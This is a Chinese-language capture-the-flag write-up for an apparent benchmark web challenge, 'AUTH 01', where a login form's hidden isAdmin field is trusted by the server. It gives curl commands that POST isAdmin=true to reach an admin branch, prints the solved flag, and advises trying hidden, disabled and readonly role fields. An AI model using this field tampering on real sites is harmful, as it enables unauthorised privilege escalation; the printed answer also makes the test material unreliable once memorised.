## 题解

### 入口与指纹

`Apache/2.4.25 (Debian)` + **`X-Powered-By: PHP/5.6.40`**，标题 `AUTH 01`（Springfield 主题）。

登录表单里有一个**明晃晃的隐藏字段**：

```html
<form action="index.php" method="POST">
  Username: <input type="text" name="username">
  Password: <input type="password" name="password">
  <input type="hidden" name="isAdmin" value="false" />
  <button type="submit">Login</button>
</form>
```

### 关键观察

**1. `isAdmin` 是客户端提交的，服务端直接采信。**

```bash
curl -X POST -d 'username=admin&password=admin&isAdmin=true' http://$T/index.php
```

响应里直接出现 flag：

```text
Welcome …
flag{2d954360-2f66-47be-87c3-fb45668bfc88}
```

**2. 不传 `isAdmin` 就只是普通欢迎页。**

```bash
curl -X POST -d 'username=test&password=test' http://$T/index.php
# Welcome to Springfield!（没有 flag）
```

说明 flag 的分支条件就是 `isAdmin == true`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=admin' \
  --data-urlencode 'isAdmin=true' \
  "http://$T/index.php" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

`index.php` 在 `isAdmin=true` 时的响应正文。

## 复盘

- **`type="hidden"` 是提示，不是防护。** 表单里出现隐藏的角色/状态字段时，
  第一反应就是直接 POST 它——成本 1 个请求。
- **PHP 5.6 + 这种「隐藏字段」组合，几乎必然是 mass assignment。**
  服务端通常写成 `$isAdmin = $_POST['isAdmin']`，然后 `if ($isAdmin == 'true')`。
- **对照组很重要。** 先不带 `isAdmin` 提交一次，确认「没有 flag」，
  再加上它确认「有 flag」——这样能证明变化来自这个字段，而不是别的。
- 与 `xben-005-24` / `xben-021-24` 同属一类（客户端可控角色字段），
  但那两题是 `disabled` 的 `<select>` / 表单字段，本题是 `type="hidden"`。
  **三种形式（hidden / disabled / readonly）都要试。**
